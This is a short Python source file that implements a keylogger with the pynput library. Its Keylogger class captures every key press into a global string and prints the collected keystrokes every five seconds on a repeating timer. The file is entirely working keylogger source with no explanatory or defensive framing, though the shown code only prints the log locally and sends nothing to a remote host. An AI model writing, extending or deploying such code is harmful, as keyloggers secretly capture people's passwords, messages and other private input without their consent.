#!/usr/bin/env python
import time
from pynput import keyboard
import threading

log = ""


class Keylogger:

    def process_key_press(self, key):
        global log
        try:
            log += str(key.char)

        except AttributeError:
            if key == key.space:
                log += " "
            else:
                log += f"{str(key)}"

    def report(self):
        global log
        print(log)
        log = ""
        timer = threading.Timer(5, self.report)
        timer.start()

    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.process_key_press)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()
